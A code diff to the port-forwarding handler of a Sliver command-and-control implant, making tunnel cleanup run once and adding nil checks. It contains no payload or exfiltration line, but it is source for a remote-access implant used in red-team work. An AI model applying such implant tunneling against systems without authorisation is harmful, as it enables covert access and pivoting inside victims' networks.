@@ -19,16 +19,17 @@ package tunnel_handlers
 */
 
 import (
-
-	// {{if .Config.Debug}}
-	"log"
-	// {{end}}
-
 	"context"
 	"fmt"
 	"io"
 	"net"
+	"sync"
 	"time"
+
+	// {{if .Config.Debug}}
+	"log"
+
+	// {{end}}
 
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
@@ -108,23 +109,31 @@ func PortfwdReqHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 		Data: portfwdResp,
 	}
 
+	once := sync.Once{}
 	cleanup := func(reason error) {
-		// {{if .Config.Debug}}
-		log.Printf("[portfwd] Closing tunnel %d (%s)", tunnel.ID, reason)
-		// {{end}}
-		tunnel := connection.Tunnel(tunnel.ID)
+		once.Do(func() {
+			// {{if .Config.Debug}}
+			log.Printf("[portfwd] Closing tunnel %d (%s)", tunnel.ID, reason)
+			// {{end}}
+			cleanupTunnel := connection.Tunnel(tunnel.ID)
+			if cleanupTunnel == nil {
+				return
+			}
 
-		tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
-			Closed:   true,
-			TunnelID: tunnel.ID,
+			tunnelClose, _ := proto.Marshal(&sliverpb.TunnelData{
+				Closed:   true,
+				TunnelID: cleanupTunnel.ID,
+			})
+			connection.Send <- &sliverpb.Envelope{
+				Type: sliverpb.MsgTunnelClose,
+				Data: tunnelClose,
+			}
+			connection.RemoveTunnel(cleanupTunnel.ID)
+			if dst != nil {
+				dst.Close()
+			}
+			cancelContext()
 		})
-		connection.Send <- &sliverpb.Envelope{
-			Type: sliverpb.MsgTunnelClose,
-			Data: tunnelClose,
-		}
-		connection.RemoveTunnel(tunnel.ID)
-		dst.Close()
-		cancelContext()
 	}
 
 	go func() {
